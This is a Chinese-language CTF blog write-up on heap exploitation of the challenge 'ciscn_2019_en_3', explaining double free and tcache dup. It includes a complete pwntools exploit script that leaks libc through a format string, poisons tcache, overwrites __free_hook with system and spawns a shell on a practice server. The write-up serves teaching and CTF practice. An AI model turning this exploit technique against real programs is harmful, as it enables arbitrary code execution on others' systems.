---
title: 几个堆入门
date: 2020-08-18 23:49:21
tags: 
- pwn
categories:
- CTF
---


# ciscn_2019_en_3

补充一下 double free的原理 ：堆上的某块内存被释放后，并没有将指向该堆块的指针清零，那么，我们就可以利用程序的其他部分对该内存进行再次的free，由于fast bin是LIFO队列的单向链表，对同一个元素free两次可以使其形成环状

![](https://i.loli.net/2020/08/18/r35RlIehYKpAFqU.png)

再对指针进行修改从而达到对任意地址写的效果


 tcache dup 和 double free类似，但少了很多检测 (至少该libc是这样的) 可以轻松 free两次



tcache全名*thread local caching*，它为每个线程创建一个缓存,对性能提高有显著的帮助

> `__malloc_hook`、`__realloc_hook`、`__free_hook`、`__memalign_hook` [四个全局函数hook指针](https://link.jianshu.com/?t=http://www.gnu.org/savannah-checkouts/gnu/libc/manual/html_node/Hooks-for-Malloc.html)。简单地说，就是 malloc 调用的是 __malloc_hook 指针指向的函数，所以 jemalloc 或者 tcmalloc 通过覆盖 __malloc_hook 使程序调用到它们自定义的malloc。

## 思路

- 泄露libc
- 利用tcache修改free hook

`printd_chk`可以用 %p 来泄露信息也可以利用利用read后面不补0的特性，输入8个字符把字沾满，来泄露栈上数据，得到libc

### exp

```python
from pwn import *
context( log_level = 'debug')
import sys
'''
elf = ELF('./ciscn_2019_en_3')
libc = elf.libc
'/glibc/2.28/64/lib/ld-2.28.so'
'''
_libc = './libc-2.27.so'
libc = ELF(_libc)

#p = remote("node3.buuoj.cn",26720)
from pwn import *
#p = process(['ld-2.27.so', "./ciscn_2019_en_3"], env={"LD_PRELOAD":_libc})
p = remote('node3.buuoj.cn', 26280)

def Debug(s):
    print(s)
    print('pid', proc.pidof(p))
    pause()
def s2b(s):
    if type(s) != type(b'1'):
        return bytes(s, encoding='utf-8')
    else:
        return s
def new(size,s):
	p.sendlineafter('choice:',b'1')
	p.sendlineafter('story:',str(size))

	p.sendlineafter('story:',s)
def delete(s):
	p.sendlineafter('choice:',b'4')
	p.recvuntil('index:')
	p.sendline(s)

Debug("start")

p.recvuntil('name?')
p.sendline('%p%p%p')#name
p.recvuntil('0x200x')
re = (p.recv(12))
a = int(re,16)
print('recv',hex(a))

#0xf7260

libc_base = a-0x110081 # 用了一下午错误的libc，懒得调了。。。直接相减算偏移了。。。
print('libc_base',hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
sys_add = libc_base + libc.sym['system']
print("free_hook",hex(free_hook))
print("sys_add_libc", hex(libc.sym['system']))
print("system:",hex(sys_add))
p.sendline('1234') # id

new(0x10,b'1234') # 0
new(0x10,b'/bin/sh\x00') # 1
Debug('new_heap')
delete(b'0')
delete(b'0') # double free形成环

Debug('free_hook-->debug')

new(0x10,p64(free_hook))
new(0x10,'aa')
new(0x10,p64(sys_add)) # 向free hook中写入system
Debug('del')
delete(b'1')
Debug('sh')
p.interactive()

'''
print(libc.sym['read'])
Debug('1')

0x7f5224771eb3

'''

```

### free hook覆盖后的情况

![](https://i.loli.net/2020/08/18/LCKnuZ25td7OUNm.png)



![](https://i.loli.net/2020/08/18/mCKeAVxw5HBDJg4.png)

### 调用free hook

![](https://i.loli.net/2020/08/18/R6uC1cMQSbLgw7G.png)
